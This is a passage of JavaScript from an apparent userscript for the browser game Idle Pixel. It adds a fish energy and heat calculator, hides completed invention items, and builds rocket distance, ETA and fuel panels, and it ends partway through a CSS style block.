        window.UIT_FISH_ENERGY_MAP = {
            // Normal Raw Fish
            shrimp: 25,
            anchovy: 100,
            sardine: 200,
            crab: 500,
            piranha: 1000,
            salmon: 100,
            trout: 300,
            pike: 1000,
            eel: 3000,
            rainbow_fish: 30000,
            tuna: 500,
            swordfish: 3000,
            manta_ray: 9000,
            shark: 20000,
            whale: 40000,

            // Shiny Raw Fish
            shrimp_shiny: 125,
            anchovy_shiny: 500,
            sardine_shiny: 1000,
            crab_shiny: 2500,
            piranha_shiny: 5000,
            salmon_shiny: 500,
            trout_shiny: 1500,
            pike_shiny: 5000,
            eel_shiny: 15000,
            rainbow_fish_shiny: 150000,
            tuna_shiny: 2500,
            swordfish_shiny: 15000,
            manta_ray_shiny: 45000,
            shark_shiny: 100000,
            whale_shiny: 200000,

            // Mega Shiny Raw Fish
            shrimp_mega_shiny: 625,
            anchovy_mega_shiny: 2500,
            sardine_mega_shiny: 5000,
            crab_mega_shiny: 12500,
            piranha_mega_shiny: 25000,
            salmon_mega_shiny: 2500,
            trout_mega_shiny: 7500,
            pike_mega_shiny: 25000,
            eel_mega_shiny: 75000,
            rainbow_fish_mega_shiny: 750000,
            tuna_mega_shiny: 12500,
            swordfish_mega_shiny: 75000,
            manta_ray_mega_shiny: 225000,
            shark_mega_shiny: 500000,
            whale_mega_shiny: 1000000,

            // Misc Fish
            small_stardust_fish: 1000,
            medium_stardust_fish: 2500,
            large_stardust_fish: 5000,
            angler_fish: 100000,
        };

        window.UIT_FISH_HEAT_MAP = {
            // Normal Raw Fish
            shrimp: 10,
            anchovy: 20,
            sardine: 40,
            crab: 75,
            piranha: 120,
            salmon: 20,
            trout: 40,
            pike: 110,
            eel: 280,
            rainbow_fish: 840,
            tuna: 75,
            swordfish: 220,
            manta_ray: 1200,
            shark: 3000,
            whale: 5000,

            //Shiny Raw Fish
            shrimp_shiny: 10,
            anchovy_shiny: 20,
            sardine_shiny: 40,
            crab_shiny: 75,
            piranha_shiny: 120,
            salmon_shiny: 20,
            trout_shiny: 40,
            pike_shiny: 110,
            eel_shiny: 280,
            rainbow_fish_shiny: 840,
            tuna_shiny: 75,
            swordfish_shiny: 220,
            manta_ray_shiny: 1200,
            shark_shiny: 3000,
            whale_shiny: 5000,

            //Mega Shiny Raw Fish
            shrimp_mega_shiny: 10,
            anchovy_mega_shiny: 20,
            sardine_mega_shiny: 40,
            crab_mega_shiny: 75,
            piranha_mega_shiny: 120,
            salmon_mega_shiny: 20,
            trout_mega_shiny: 40,
            pike_mega_shiny: 110,
            eel_mega_shiny: 280,
            rainbow_fish_mega_shiny: 840,
            tuna_mega_shiny: 75,
            swordfish_mega_shiny: 220,
            manta_ray_mega_shiny: 1200,
            shark_mega_shiny: 3000,
            whale_mega_shiny: 5000,

            // Misc Fish
            small_stardust_fish: 300,
            medium_stardust_fish: 600,
            large_stardust_fish: 2000,
            angler_fish: 10000,
        };
        return {
            initFishing: function () {
                const fishingNetItembox = document.querySelector(
                    'itembox[data-item=""fishing_net""]'
                );
                if (fishingNetItembox) {
                    const heatFishingTab = document.createElement(""itembox"");
                    heatFishingTab.id = ""heat-fishing-tab"";
                    heatFishingTab.dataset.item = ""heat"";
                    heatFishingTab.classList.add(""shadow"", ""hover"");
                    heatFishingTab.setAttribute(""data-bs-toggle"", ""tooltip"");

                    heatFishingTab.innerHTML = `
                        <div class=""center mt-1"">
                            <img src=""${UIT_IMAGE_URL_BASE}heat.png"" width=""50px"" height=""50px"">
                        </div>
                        <div class=""center mt-2"">
                            <item-display data-format=""number"" data-key=""heat""></item-display>
                        </div>
                    `;
                    fishingNetItembox.before(heatFishingTab);
                }

                // Fishing Energy/Heat Info
                const panelFishing = document.querySelector(""#panel-fishing"");
                const progressBar = panelFishing.querySelector("".progress-bar"");

                const hrElement = document.createElement(""hr"");
                progressBar.insertAdjacentElement(""afterend"", hrElement);

                const containerDiv = document.createElement(""div"");
                containerDiv.style.display = ""flex"";
                containerDiv.style.flexDirection = ""column"";

                const h5Element = document.createElement(""h5"");
                h5Element.textContent = ""Fish Energy"";

                const buttonElement = document.createElement(""button"");
                buttonElement.textContent = ""Show"";
                buttonElement.id = ""fish_energy-visibility-button"";
                buttonElement.addEventListener(""click"", show_hide);
                h5Element.appendChild(buttonElement);

                const innerDiv = document.createElement(""div"");
                innerDiv.id = ""fishing-calculator-div"";

                const rawFishEnergySpan = document.createElement(""span"");
                rawFishEnergySpan.textContent = ""Total Raw Fish Energy: "";

                const rawFishEnergyNumberSpan = document.createElement(""span"");
                rawFishEnergyNumberSpan.textContent = ""0"";
                rawFishEnergyNumberSpan.id = ""raw-fish-energy-number"";
                rawFishEnergySpan.appendChild(rawFishEnergyNumberSpan);

                const br1Element = document.createElement(""br"");

                const heatToCookAllSpan = document.createElement(""span"");
                heatToCookAllSpan.textContent = ""Heat To Cook All: "";

                const fishHeatRequiredNumberSpan = document.createElement(""span"");
                fishHeatRequiredNumberSpan.textContent = ""0"";
                fishHeatRequiredNumberSpan.id = ""fish-heat-required-number"";
                heatToCookAllSpan.appendChild(fishHeatRequiredNumberSpan);

                const br2Element = document.createElement(""br"");

                const totalCookedFishEnergySpan = document.createElement(""span"");
                totalCookedFishEnergySpan.textContent = ""Total Cooked Fish Energy: "";

                const cookedFishEnergyNumberSpan = document.createElement(""span"");
                cookedFishEnergyNumberSpan.textContent = ""0"";
                cookedFishEnergyNumberSpan.id = ""cooked-fish-energy-number"";
                totalCookedFishEnergySpan.appendChild(cookedFishEnergyNumberSpan);

                innerDiv.appendChild(rawFishEnergySpan);
                innerDiv.appendChild(br1Element);
                innerDiv.appendChild(heatToCookAllSpan);
                innerDiv.appendChild(br2Element);
                innerDiv.appendChild(totalCookedFishEnergySpan);

                containerDiv.appendChild(h5Element);
                containerDiv.appendChild(innerDiv);

                hrElement.insertAdjacentElement(""afterend"", containerDiv);

                function show_hide() {
                    const button = document.querySelector(
                        ""#fish_energy-visibility-button""
                    );
                    const div = document.querySelector(""#fishing-calculator-div"");

                    if (button.textContent === ""Hide"") {
                        div.style.display = ""none"";
                        button.textContent = ""Show"";
                    } else {
                        div.style.display = ""block"";
                        button.textContent = ""Hide"";
                    }
                }
                uitFishing().calcFishEnergy();
                document.querySelector(""#fishing-calculator-div"").style.display =
                    ""none"";
            },

            calcFishEnergy: function () {
                const fishRawEnergy = Object.keys(UIT_FISH_ENERGY_MAP);
                const fishHeat = Object.keys(UIT_FISH_HEAT_MAP);
                const fishCookedEnergy = Object.keys(UIT_FISH_ENERGY_MAP);
                let totalRawEnergy = 0;
                let totalHeat = 0;
                let totalCookedEnergy = 0;
                const collectorModeFish = getThis.getConfig(""minusOneHeatInFishingTab"");

                fishRawEnergy.forEach((fish) => {
                    let currentRawFish = getVar(""raw_"" + fish, 0, ""int"");
                    let currentCookedFish = getVar(""cooked_"" + fish, 0, ""int"");

                    if (currentRawFish > 0 && collectorModeFish) {
                        currentRawFish--;
                    }
                    if (currentCookedFish > 0 && collectorModeFish) {
                        currentCookedFish--;
                    }
                    const currentRawEnergy = currentRawFish * UIT_FISH_ENERGY_MAP[fish];
                    const currentHeat = currentRawFish * UIT_FISH_HEAT_MAP[fish];
                    const currentCookedEnergy =
                        currentCookedFish * UIT_FISH_ENERGY_MAP[fish];
                    totalRawEnergy += currentRawEnergy;
                    totalHeat += currentHeat;
                    totalCookedEnergy += currentCookedEnergy;
                });

                document.getElementById(""raw-fish-energy-number"").textContent =
                    totalRawEnergy.toLocaleString();
                document.getElementById(""fish-heat-required-number"").textContent =
                    totalHeat.toLocaleString();
                document.getElementById(""cooked-fish-energy-number"").textContent =
                    totalCookedEnergy.toLocaleString();
            },
        };
    };

    const uitInvention = function () {
        // No global constants/declarations
        return {
            hideOrbsAndRing: function () {
                if (Globals.currentPanel === ""panel-invention"") {
                    const masterRing = getVar(""master_ring_assembled"", 0, ""int"");
                    const fishingOrb = getVar(
                        ""mega_shiny_glass_ball_fish_assembled"",
                        0,
                        ""int""
                    );
                    const leafOrb = getVar(
                        ""mega_shiny_glass_ball_leaf_assembled"",
                        0,
                        ""int""
                    );
                    const logsOrb = getVar(
                        ""mega_shiny_glass_ball_logs_assembled"",
                        0,
                        ""int""
                    );
                    const monstersOrb = getVar(
                        ""mega_shiny_glass_ball_monsters_assembled"",
                        0,
                        ""int""
                    );
                    const volcanoTab = getVar(""volcano_tablette_charged"", 0, ""int"");
                    const ancientTab = getVar(""ancient_tablette_charged"", 0, ""int"");

                    const selectors = {
                        masterRing:
                            ""#invention-table > tbody [data-invention-item=master_ring]"",
                        fishingOrb:
                            ""#invention-table > tbody [data-invention-item=mega_shiny_glass_ball_fish]"",
                        leafOrb:
                            ""#invention-table > tbody [data-invention-item=mega_shiny_glass_ball_leaf]"",
                        logsOrb:
                            ""#invention-table > tbody [data-invention-item=mega_shiny_glass_ball_logs]"",
                        monstersOrb:
                            ""#invention-table > tbody [data-invention-item=mega_shiny_glass_ball_monsters]"",
                    };

                    const uiTweaksConfig = getThis.getConfig(""hideOrbRing"");

                    for (const orb in selectors) {
                        if (selectors.hasOwnProperty(orb)) {
                            const element = document.querySelector(selectors[orb]);
                            if (uiTweaksConfig) {
                                if (orb === ""masterRing"" && masterRing === 1) {
                                    element.style.display = ""none"";
                                } else if (orb === ""fishingOrb"" && fishingOrb === 1) {
                                    element.style.display = ""none"";
                                } else if (orb === ""leafOrb"" && leafOrb === 1) {
                                    element.style.display = ""none"";
                                } else if (orb === ""logsOrb"" && logsOrb === 1) {
                                    element.style.display = ""none"";
                                } else if (orb === ""monstersOrb"" && monstersOrb === 1) {
                                    element.style.display = ""none"";
                                } else {
                                    element.style.display = """";
                                }
                            } else {
                                if (orb !== ""masterRing"" && volcanoTab === 1) {
                                    element.style.display = """";
                                } else if (orb === ""masterRing"" && ancientTab === 1) {
                                    element.style.display = """";
                                } else {
                                    element.style.display = ""none"";
                                }
                            }
                        }
                    }
                }
            },
        };
    };

    const uitRocket = function () {
        window.uitMoonImg = `https://idle-pixel.wiki/images/4/47/Moon.png`;
        window.uitSunImg = `https://idle-pixel.wiki/images/6/61/Sun.png`;
        window.uitRocketImg = `${UIT_IMAGE_URL_BASE}rocket.gif`;
        window.uitMegaRocketImg = `${UIT_IMAGE_URL_BASE}mega_rocket.gif`;
        return {
            configChange: function () {
                const rocketETATimer = getThis.getConfig(""rocketETATimer"");
                if (rocketETATimer) {
                    document.getElementById(""notification-rocket-timer"").style.display =
                        ""inline-block"";
                    document.getElementById(
                        ""notification-mega_rocket-timer""
                    ).style.display = ""inline-block"";
                } else {
                    document.getElementById(""notification-rocket-timer"").style.display =
                        ""none"";
                    document.getElementById(
                        ""notification-mega_rocket-timer""
                    ).style.display = ""none"";
                }

                const hideRocketKM = getThis.getConfig(""hideRocketKM"");
                if (hideRocketKM) {
                    document.getElementById(""notification-rocket-label"").style.display =
                        ""none"";
                    document.getElementById(
                        ""notification-mega_rocket-label""
                    ).style.display = ""none"";
                } else {
                    document.getElementById(""notification-rocket-label"").style.display =
                        ""inline-block"";
                    document.getElementById(
                        ""notification-mega_rocket-label""
                    ).style.display = ""inline-block"";
                }

                const rocket_usable = getVar(""rocket_usable"", 0, ""int"");
                const rocket_travel_check = getVar(
                    ""rocket_distance_required"",
                    0,
                    ""int""
                );
                const rocket_pot_timer_check = getVar(""rocket_potion_timer"", 0, ""int"");
                const rocket_check = getVar(""mega_rocket"", 0, ""int"");

                if (
                    getThis.getConfig(""leftSideRocketInfoSection"") &&
                    rocket_usable > 0
                ) {
                    document.getElementById(""current-rocket-info"").style.display =
                        ""block"";

                    if (getThis.getConfig(""leftSideRocketInfo"")) {
                        document.getElementById(""rocket-travel-info"").style.display =
                            ""block"";
                        document.getElementById(""notification-mega_rocket"").style.display =
                            ""none"";
                        document.getElementById(""notification-rocket"").style.display =
                            ""none"";
                    } else if (rocket_travel_check > 0 && rocket_check == 1) {
                        document.getElementById(""notification-mega_rocket"").style.display =
                            ""block"";
                        document.getElementById(""rocket-travel-info"").style.display =
                            ""none"";
                    } else if (rocket_travel_check > 0 && rocket_check == 0) {
                        document.getElementById(""notification-rocket"").style.display =
                            ""block"";
                        document.getElementById(""rocket-travel-info"").style.display =
                            ""none"";
                    } else {
                        document.getElementById(""rocket-travel-info"").style.display =
                            ""none"";
                    }

                    if (getThis.getConfig(""leftSideRocketFuel"")) {
                        document.getElementById(""current-rocket-fuel-info"").style.display =
                            ""block"";
                    } else {
                        document.getElementById(""current-rocket-fuel-info"").style.display =
                            ""none"";
                    }

                    if (getThis.getConfig(""leftSideRocketPot"")) {
                        document.getElementById(""current-rocket-pot-info"").style.display =
                            ""block"";
                        document.getElementById(
                            ""notification-potion-rocket_potion_timer""
                        ).style.display = ""none"";
                    } else if (rocket_pot_timer_check > 0) {
                        document.getElementById(
                            ""notification-potion-rocket_potion_timer""
                        ).style.display = ""block"";
                        document.getElementById(""current-rocket-pot-info"").style.display =
                            ""none"";
                    } else {
                        document.getElementById(""current-rocket-pot-info"").style.display =
                            ""none"";
                    }
                } else {
                    document.getElementById(""current-rocket-info"").style.display = ""none"";
                }
            },

            onLogin: function () {
                const moonImg = `https://idle-pixel.wiki/images/4/47/Moon.png`;
                const sunImg = `https://idle-pixel.wiki/images/6/61/Sun.png`;
                const rocketImg = `${UIT_IMAGE_URL_BASE}rocket.png`;
                const megaRocketImg = `${UIT_IMAGE_URL_BASE}mega_rocket.gif`;
                const currentLocation = uitRocket().currentLocation();
                const currentRocket = uitRocket().currentRocketImg();

                // ""Moon & Sun Distance Info
                const rocketInfoSideCar = document.createElement(""div"");
                rocketInfoSideCar.id = ""rocket-info-side_car"";
                rocketInfoSideCar.style.paddingLeft = ""20px"";
                rocketInfoSideCar.style.paddingTop = ""10px"";
                rocketInfoSideCar.style.paddingBottom = ""10px"";

                rocketInfoSideCar.innerHTML = `
			<span id=""rocket-info-label"">MOON & SUN DISTANCE</span>
			<br/>
			<style type=""text/css"">
				.span2 {
					display: inline-block;
					text-align: right;
					width: 100px;
				}
			</style>
			<span onClick=""websocket.send(Modals.clicks_rocket())"" id=""menu-bar-rocket_moon"">
			<img id=""moon-img"" class=""img-20"" src=""${uitMoonImg}"">
			<span class=""span2 rocket-dist_moon"">0</span>
			<span style='margin-left:0.75em;' class=""rocket-dist_moon-symbol"">üî¥</span>
			<img id=""moon-rocket-img"" class=""img-20"" src=""${currentRocket}"">
			<br/>
			</span>
			<span onClick=""websocket.send(Modals.clicks_rocket())"" id=""menu-bar-rocket_sun"">
			<img id ""sun-img"" class=""img-20"" src=${uitSunImg}>
			<span class=""span2 rocket-dist_sun"">0</span>
			<span style='margin-left:0.75em;' class=""rocket-dist_sun-symbol"">üî¥</span>
			<img id=""sun-rocket-img"" class=""img-20"" src=""${currentRocket}"">
			<br/>
			</span>
		`;

                document
                    .getElementById(""game-menu-bar-skills"")
                    .insertAdjacentElement(""beforebegin"", rocketInfoSideCar);

                // ""Current Rocket Info"" side car
                const rocketInfoSideCarElement = document.getElementById(
                    ""rocket-info-side_car""
                );

                // Append HTML after #rocket-info-side_car
                const currentRocketInfo = document.createElement(""div"");
                currentRocketInfo.id = ""current-rocket-info"";
                currentRocketInfo.style.borderTop = ""1px solid rgba(66, 66, 66, 1)"";
                currentRocketInfo.style.borderBottom = ""1px solid rgba(66, 66, 66, 1)"";
                currentRocketInfo.style.paddingTop = ""10px"";
                currentRocketInfo.style.paddingBottom = ""10px"";
                /*
                    Commented out code
                    <img id=""rocket-current-travel-location-sun"" class=""img-20"" src=""${sunImg}"">
                    <img id=""rocket-type-img-mega"" class=""img-20"" src=""${megaRocketImg}"">
                    <img id=""rocket-type-img-reg"" class=""img-20"" src=""${rocketImg}"">
                */
                currentRocketInfo.innerHTML = `
		<div style=""padding-left: 20px;"">
			<span id=""current-rocket-info-label"" style:>CURRENT ROCKET INFO</span>
			<br/>
			<div id=""rocket-travel-info"">
				<div id=""rocket-travel-info-dist"">
					<img id=""rocket-current-travel-location"" class=""img-20"" src=""${currentLocation}"">
					<span id=""current-rocket-travel-distances"" style=""padding-left: 20px;"">Loading...</span>
					<br/>
				</div>
				<div id=""rocket-travel-info-eta"">
					<img id=""rocket-type-img"" class=""img-20"" src=""${currentRocket}"">
					<span id=""current-rocket-travel-times"" style=""padding-left: 20px;"">00:00:00</span>
					<br/>
				</div>
			</div>
			<div onClick=""switch_panels('panel-crafting')"" id=""current-rocket-fuel-info"">
				<img id=""rocket-rocket_fuel-img"" class=""img-20"" src=""${UIT_IMAGE_URL_BASE}rocket_fuel.png"">
				<span style=""padding-left: 20px;"">Rocket Fuel - </span>
				<span id=""rocket-fuel-count"">0</span>
				<br/>
			</div>
			<div onClick=""switch_panels('panel-brewing')"" id=""current-rocket-pot-info"">
				<img id=""rocket-rocket_potion-img"" class=""img-20"" src=""${UIT_IMAGE_URL_BASE}rocket_potion.png"">
				<span style=""padding-left: 20px;"">Rocket Potion </span>
				(<span id=""rocket-pot-count"">0</span>)
				<span> - </span>
				<span id=rocket-pot-timer>0:00:00</span>
			</div>
		</div>
		`;
                rocketInfoSideCarElement.parentNode.insertBefore(
                    currentRocketInfo,
                    rocketInfoSideCarElement.nextSibling
                );

                const elementsToHide = [""sun-rocket-img"", ""moon-rocket-img""];

                elementsToHide.forEach((elementId) => {
                    const element = document.getElementById(elementId);
                    if (element) {
                        element.style.display = ""none"";
                    }
                });

                const currentRocketInfoElement = document.getElementById(
                    ""current-rocket-info""
                );
                if (currentRocketInfoElement) {
                    currentRocketInfoElement.style.display = ""none"";
                }
            },

            timeout: function () {
                const rocket_fuel = getVar(""rocket_fuel"", 0, ""int"");
                const rocket_pot_count = getVar(""rocket_potion"", 0, ""int"");
                document.querySelector(""#rocket-fuel-count"").textContent = rocket_fuel;
                document.querySelector(""#rocket-pot-count"").textContent =
                    rocket_pot_count;
            },

            onVar: function () {
                const rocket_usable = getVar(""rocket_usable"", 0, ""int"");
                const rocket_travel_check = getVar(
                    ""rocket_distance_required"",
                    0,
                    ""int""
                );
                const rocket_pot_timer_check = getVar(""rocket_potion_timer"", 0, ""int"");
                const rocket_check = getVar(""mega_rocket"", 0, ""int"");
                if (
                    getThis.getConfig(""leftSideRocketInfoSection"") &&
                    rocket_usable > 0
                ) {
                    document.getElementById(""current-rocket-info"").style.display =
                        ""block"";

                    if (getThis.getConfig(""leftSideRocketInfo"")) {
                        document.getElementById(""rocket-travel-info"").style.display = ""block"";
                        document.getElementById(""notification-mega_rocket"").style.display = ""none"";
                        document.getElementById(""notification-rocket"").style.display = ""none"";
                    } else if (rocket_travel_check > 0 && rocket_check == 1) {
                        document.getElementById(""notification-mega_rocket"").style.display = ""block"";
                        document.getElementById(""rocket-travel-info"").style.display = ""none"";
                    } else if (rocket_travel_check > 0 && rocket_check == 0) {
                        document.getElementById(""notification-rocket"").style.display = ""inline-block"";
                        document.getElementById(""rocket-travel-info"").style.display = ""none"";
                    } else {
                        document.getElementById(""rocket-travel-info"").style.display = ""none"";
                    }

                    if (getThis.getConfig(""leftSideRocketFuel"")) {
                        document.getElementById(""current-rocket-fuel-info"").style.display =
                            ""block"";
                    } else {
                        document.getElementById(""current-rocket-fuel-info"").style.display =
                            ""none"";
                    }

                    if (getThis.getConfig(""leftSideRocketPot"")) {
                        document.getElementById(""current-rocket-pot-info"").style.display =
                            ""block"";
                        document.getElementById(
                            ""notification-potion-rocket_potion_timer""
                        ).style.display = ""none"";
                    } else if (rocket_pot_timer_check > 0) {
                        document.getElementById(
                            ""notification-potion-rocket_potion_timer""
                        ).style.display = ""inline-block"";
                        document.getElementById(""current-rocket-pot-info"").style.display =
                            ""none"";
                    } else {
                        document.getElementById(""current-rocket-pot-info"").style.display =
                            ""none"";
                    }
                } else {
                    document.getElementById(""current-rocket-info"").style.display = ""none"";
                }
            },

            varChange: function () {
                const status = getVar(""rocket_status"", ""none"", ""string"");
                const km = getVar(""rocket_km"", 0, ""int"");
                var rocket_quest = getVar(""junk_planet_quest"", 0, ""int"");
                var rQComp;
                if (rocket_quest == -1) {
                    rQComp = 2;
                } else {
                    rQComp = 1;
                }
                const total = getVar(""rocket_distance_required"", 0, ""int"");
                const rocket_pot = getVar(""rocket_potion_timer"", 0, ""int"");
                const rocket_type = getVar(""mega_rocket"", 0, ""int"");
                const rocket_fuel = getVar(""rocket_fuel"", 0, ""int"");
                const rocket_pot_count = getVar(""rocket_potion"", 0, ""int"");
                const rocket_pot_timer = format_time(rocket_pot);
                const rocket_speed_moon = rocket_pot * 12 * rQComp;
                const rocket_speed_sun = rocket_pot * 2400 * rQComp;
                let pot_diff = """";
                let pot_diff_mega = """";
                let label = """";
                let label_side = """";
                let label_side_car_dist = """";
                let label_side_car_eta = """";
                if (status == ""to_moon"" || status == ""from_moon"") {
                    const remaining =
                        status == ""to_moon"" ? (total - km) / rQComp : km / rQComp;
                    pot_diff = Math.round(remaining / 1.5) - rocket_pot * 8;
                    let eta = """";
                    if (rocket_pot > 0) {
                        if (rocket_speed_moon <= remaining * rQComp) {
                            eta = rocket_pot + pot_diff;
                        } else {
                            eta = Math.round(remaining / 12);
                        }
                    } else {
                        eta = Math.round(remaining / 1.5);
                    }
                    label = format_time(eta);
                    label_side = format_time(eta);
                    if (
                        getThis.getConfig(""rocketETATimer"") &&
                        !getThis.getConfig(""hideRocketKM"")
                    ) {
                        label = "" - "" + label;
                        label_side_car_dist =
                            km.toLocaleString() + ""/"" + total.toLocaleString();
                        label_side_car_eta = label_side;
                    }
                } else if (status == ""to_sun"" || status == ""from_sun"") {
                    const remaining =
                        status == ""to_sun"" ? (total - km) / rQComp : km / rQComp;
                    pot_diff_mega = Math.round(remaining / 300) - rocket_pot * 8;
                    let eta = """";
                    if (rocket_pot > 0) {
                        if (rocket_speed_sun <= remaining * rQComp) {
                            eta = rocket_pot + pot_diff_mega;
                        } else {
                            eta = Math.round(remaining / 2400);
                        }
                    } else {
                        eta = Math.round(remaining / 300);
                    }
                    label = format_time(eta);
                    label_side = format_time(eta);
                    if (
                        getThis.getConfig(""rocketETATimer"") &&
                        !getThis.getConfig(""hideRocketKM"")
                    ) {
                        label = "" - "" + label;
                        if (km == total) {
                            label_side_car_dist = ""LANDED"";
                        } else if (total == 0) {
                            label_side_car_dist = ""IDLE"";
                        } else {
                            label_side_car_dist =
                                km.toLocaleString() + ""/"" + total.toLocaleString();
                            label_side_car_eta = label_side;
                        }
                    }
                }

                document.querySelector(""#current-rocket-travel-distances"").textContent =
                    label_side_car_dist;
                document.querySelector(""#current-rocket-travel-times"").textContent =
                    label_side_car_eta;
                document.querySelector(""#rocket-fuel-count"").textContent = rocket_fuel;
                document.querySelector(""#rocket-pot-count"").textContent =
                    rocket_pot_count;
                document.querySelector(""#rocket-pot-timer"").textContent =
                    rocket_pot_timer;
            },

            rocketInfoUpdate: function (variable) {
                if (variable == ""moon_distance"") {
                    var distanceMoon = Number(var_moon_distance);
                    document
                        .getElementById(""menu-bar-rocket_moon"")
                        .querySelector("".rocket-dist_moon"").textContent =
                        distanceMoon.toLocaleString();
                    var goodMoon = Number(getThis.getConfig(""goodMoon""));
                    var rocketDistMoonSymbol = document
                        .getElementById(""menu-bar-rocket_moon"")
                        .querySelector("".rocket-dist_moon-symbol"");
                    rocketDistMoonSymbol.textContent =
                        goodMoon >= distanceMoon ? ""üü¢"" : ""üî¥"";
                } else if (variable == ""sun_distance"") {
                    var distanceSun = Number(var_sun_distance);
                    document
                        .getElementById(""menu-bar-rocket_sun"")
                        .querySelector("".rocket-dist_sun"").textContent =
                        distanceSun.toLocaleString();
                    var goodSun = Number(getThis.getConfig(""goodSun""));
                    var rocketDistSunSymbol = document
                        .getElementById(""menu-bar-rocket_sun"")
                        .querySelector("".rocket-dist_sun-symbol"");
                    rocketDistSunSymbol.textContent =
                        goodSun >= distanceSun ? ""üü¢"" : ""üî¥"";
                }
            },

            currentRocketImg: function () {
                if (getVar(""mega_rocket_crafted"", 0, ""int"") == 1) {
                    return uitMegaRocketImg;
                } else {
                    return uitRocketImg;
                }
            },

            currentLocation: function () {
                const status = getVar(""rocket_status"", ""none"", ""string"");
                if (
                    status === ""to_sun"" ||
                    status === ""from_sun"" ||
                    status === ""at_sun""
                ) {
                    return uitSunImg;
                } else if (
                    status === ""to_moon"" ||
                    status === ""from_moon"" ||
                    status === ""at_moon""
                ) {
                    return uitMoonImg;
                } else {
                    return uitMoonImg;
                }
            },

            rocketStatus: function () {
                const rocketStatus = getVar(""rocket_status"", """");
                if (rocketStatus.startsWith(""to"")) {
                    uitRocket().toLocation(rocketStatus);
                } else if (rocketStatus.startsWith(""from"")) {
                    uitRocket().fromLocation(rocketStatus);
                } else if (rocketStatus.startsWith(""at"")) {
                    uitRocket().atLocation(rocketStatus);
                } else {
                    uitRocket().noLocation();
                }
            },

            toLocation: function (location) {
                // Moon & Sun Distance Area
                const locationImg = uitRocket().currentLocation();
                const rocketImg = uitRocket().currentRocketImg();
                if (location.endsWith(""moon"")) {
                    document.getElementById(""moon-rocket-img"").src = rocketImg;
                    document.getElementById(""moon-rocket-img"").style.transform = ""rotate(0deg)"";
                    document.getElementById(""moon-rocket-img"").style.display = ""inline-block"";
                    document.getElementById(""sun-rocket-img"").style.display = ""none"";
                } else {
                    document.getElementById(""sun-rocket-img"").src = rocketImg;
                    document.getElementById(""sun-rocket-img"").style.transform = ""rotate(0deg)"";
                    document.getElementById(""sun-rocket-img"").style.display = ""inline-block"";
                    document.getElementById(""moon-rocket-img"").style.display = ""none"";
                }

                // Rocket Info Section
                document.getElementById(""rocket-travel-info-dist"").style.display = """";
                document.getElementById(""rocket-current-travel-location"").src = locationImg;
                document.getElementById(""rocket-type-img"").src = rocketImg;
                document.getElementById(""rocket-type-img"").style.transform = ""rotate(0deg)"";
            },

            fromLocation: function (location) {
                const status = uitRocket().currentLocation();
                // Moon & Sun Distance Area
                const locationImg = uitRocket().currentLocation();
                const rocketImg = uitRocket().currentRocketImg();
                if (location.endsWith(""moon"")) {
                    document.getElementById(""moon-rocket-img"").src = rocketImg;
                    document.getElementById(""moon-rocket-img"").style.transform = ""rotate(180deg)"";
                    document.getElementById(""moon-rocket-img"").style.display = ""inline-block"";
                    document.getElementById(""sun-rocket-img"").style.display = ""none"";
                } else {
                    document.getElementById(""sun-rocket-img"").src = rocketImg;
                    document.getElementById(""sun-rocket-img"").style.transform = ""rotate(180deg)"";
                    document.getElementById(""sun-rocket-img"").style.display = ""inline-block"";
                    document.getElementById(""moon-rocket-img"").style.display = ""none"";
                }

                // Rocket Info Section
                document.getElementById(""rocket-travel-info-dist"").style.display = """";
                document.getElementById(""rocket-current-travel-location"").src =
                    locationImg;
                document.getElementById(""rocket-type-img"").src = rocketImg;
                document.getElementById(""rocket-type-img"").style.transform =
                    ""rotate(180deg)"";
            },

            atLocation: function (location) {
                const status = uitRocket().currentLocation();
                // Moon & Sun Distance Area
                const locationImg = uitRocket().currentLocation();
                const rocketImg = uitRocket().currentRocketImg();
                if (location.endsWith(""moon"")) {
                    document.getElementById(""moon-rocket-img"").src = rocketImg;
                    document.getElementById(""moon-rocket-img"").style.transform = ""rotate(135deg)"";
                    document.getElementById(""moon-rocket-img"").style.display = ""inline-block"";
                    document.getElementById(""sun-rocket-img"").style.display = ""none"";
                } else {
                    document.getElementById(""sun-rocket-img"").src = rocketImg;
                    document.getElementById(""sun-rocket-img"").style.transform = ""rotate(135deg)"";
                    document.getElementById(""sun-rocket-img"").style.display = ""inline-block"";
                    document.getElementById(""moon-rocket-img"").style.display = ""none"";
                }

                // Rocket Info Section
                document.getElementById(""rocket-travel-info"").style.display = """";
                document.getElementById(""rocket-current-travel-location"").src = locationImg;
                document.getElementById(""rocket-type-img"").src = rocketImg;
                document.getElementById(""rocket-type-img"").style.transform = ""rotate(135deg)"";
                document.getElementById(""current-rocket-travel-times"").textContent = ""LANDED"";
            },

            noLocation: function () {
                // Moon & Sun Distance Area
                document.getElementById(""moon-rocket-img"").style.display = ""none"";
                document.getElementById(""sun-rocket-img"").style.display = ""none"";

                // Rocket Info Section
                document.getElementById(""rocket-travel-info-dist"").style.display = ""none"";
                document.getElementById(""rocket-type-img"").style.transform =
                    ""rotate(-45deg)"";
                document.getElementById(""current-rocket-travel-times"").textContent =
                    ""IDLE"";
            },
        };
    };

    const uitMisc = function () {
        // Globals constants
        return {
            initStyles: function () {
                const style = document.createElement(""style"");
                style.id = ""styles-ui-tweaks"";
                style.textContent = `
				#chat-top {
				  display: flex;
				  flex-direction: row;
				  justify-content: left;
				}
				#chat-top > button {
				  margin-left: 2px;
				  margin-right: 2px;
				  white-space: nowrap;
				}
				#content.side-chat {
				  display: grid;
				  column-gap: 0;
				  row-gap: 0;
				  grid-template-columns: 2fr minmax(300px, 1fr);
				  grid-template-rows: 1fr;
				}
				#content.side-chat #game-chat {
				  max-height: calc(100vh - 32px);
				}
				#content.side-chat #game-chat > :first-child {
				  display: grid;
				  column-gap: 0;
				  row-gap: 0;
				  grid-template-columns: 1fr;
				  grid-template-rows: auto 1fr auto;
				  height: calc(100% - 16px);
				}
				#content.side-chat #chat-area {
				  height: auto !important;
				}
				.farming-patches-area.condensed {
				  display: flex;
				  flex-direction: row;
				  justify-items: flex-start;
				  width: fit-content;
				}
				.farming-patches-area.condensed > span {
				  width: 100px;
				  max-height: 200px;
				  border: 1px solid green;
				}
				.farming-patches-area.condensed img {
				  width: 100px;
				}
				#panel-gathering .gathering-box.condensed {
				  height: 240px;
				  position: relative;
				  margin: 4px auto;
				  padding-left: 4px;
				  padding-right: 4px;
				}
				#panel-gathering .gathering-box.condensed img.gathering-area-image {
				  position: absolute;
				  top: 10px;
				  left: 10px;
				  width: 68px;
				  height: 68px;
				}
				#panel-gathering .gathering-box.condensed br:nth-child(2),
